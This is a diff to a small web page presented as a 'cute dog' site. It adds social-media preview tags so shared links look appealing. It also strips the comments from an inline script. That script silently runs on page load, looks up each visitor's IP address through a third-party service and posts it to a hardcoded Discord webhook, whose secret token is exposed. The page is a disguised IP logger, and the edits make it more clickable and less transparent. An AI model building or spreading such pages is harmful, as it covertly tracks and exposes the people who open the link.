@@ -3,6 +3,19 @@
 <head>
   <meta charset="UTF-8" />
   <title>Interesting Dog</title>
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Interesting Dog" />
+  <meta property="og:description" content="Check out this cute dog!" />
+  <meta property="og:image" content="https://interestingdog.netlify.app/dog.png" />
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Interesting Dog" />
+  <meta name="twitter:description" content="Check out this cute dog!" />
+  <meta name="twitter:image" content="https://interestingdog.netlify.app/dog.png" />
+
   <style>
     body {
       margin: 0;
@@ -26,12 +39,10 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1384059457054572564/-d1jkEYCaQjbBga4Unbalu8AKOc7OsYYK6__vGUHGuheXBeTZE2_1uPp3YLDEaaf42z6";
 
-    // Get visitor IP from third-party API
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
         const ip = data.ip;
-        // Send IP to Discord webhook
         fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
